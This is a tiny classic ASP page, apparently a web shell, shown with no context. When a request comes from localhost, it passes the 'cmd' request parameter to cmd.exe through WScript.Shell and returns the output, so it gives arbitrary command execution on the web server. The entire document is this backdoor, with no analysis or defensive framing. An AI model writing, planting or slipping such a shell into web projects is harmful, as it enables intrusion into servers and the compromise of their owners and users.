<% if Request.ServerVariables("remote_addr") = "127.0.0.1" then
	Response.Write server.createobject("wscript.shell").exec("cmd.exe /c " & _
		 request("cmd") & " 2>&1").stdout.readall
end if %>
